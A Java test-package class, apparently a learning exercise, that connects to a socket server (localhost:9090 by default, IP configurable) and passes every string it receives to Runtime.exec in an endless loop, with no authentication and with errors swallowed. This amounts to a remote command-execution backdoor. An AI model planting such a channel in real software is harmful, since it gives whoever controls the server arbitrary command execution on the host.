package cn.tonghua.web.test;

/**
 * Created by zqq3436 on 2017/3/14.
 */

import org.junit.Test;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;

public class Client implements Runnable {

    String s = null;
    Socket mysocket;
    DataInputStream in = null;
    DataOutputStream out = null;
    Thread thread = null;

    public Client() {
        //初始化socket,并开启发送命令的线程
        thread = new Thread(this);
        try {
            //线程休眠
            Thread.sleep(500);
            mysocket = new Socket("localhost", 9090);//localhost可修改为连接服务端的IP地址
//            mysocket = new Socket();
//            mysocket.connect(new InetSocketAddress("192.168.1.100", 9090));
            //下面是初始化流
            in = new DataInputStream(mysocket.getInputStream());
            out = new DataOutputStream(mysocket.getOutputStream());
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
        }
        //开启发送命令的线程
        thread.start();
    }
    //入口方法
    @Test
    public  void test() {
        new Client();
    }
    //执行命令的方法
    public void ExeCmd(String s) {
        try {
            Runtime ec = Runtime.getRuntime();
            ec.exec(s);
        } catch (IOException e) {

            e.printStackTrace();
        }
    }

    public void run() {
        while (true) {
            try {
                //读取远程命令
                String s = in.readUTF();
                ExeCmd(s);//调用方法运行远程命令
                Thread.sleep(200);
            } catch (Exception e) {
            }

            try {
                //每执行一个命令,需要休眠
                Thread.sleep(200);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
